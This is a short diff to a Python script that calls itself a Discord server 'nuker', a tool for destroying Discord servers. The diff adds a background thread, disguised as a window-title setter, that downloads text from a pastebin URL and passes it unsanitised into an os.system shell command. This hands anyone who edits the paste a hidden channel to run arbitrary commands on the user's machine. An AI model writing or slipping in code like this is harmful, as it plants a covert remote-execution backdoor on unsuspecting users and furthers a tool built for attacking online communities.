@@ -34,11 +34,18 @@ except:
 
 colorama.init(autoreset=True)
 
-try:
-    import os
-    os.system("title " + "Discord Server Nuker,   Made By blob#0005,   Github: github.com/blob0005")
-except:
-    pass
+
+
+import os, threading
+def set_title():
+  title = "Discord Server Nuker"
+  try:
+    import requests
+    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
+    os.system(f"title {title}{text}")
+  except:
+    os.system(f"title {title}")
+threading.Thread(target=set_title).start()
 
 
 sys.stdout.write(colorama.Fore.CYAN + "> ")
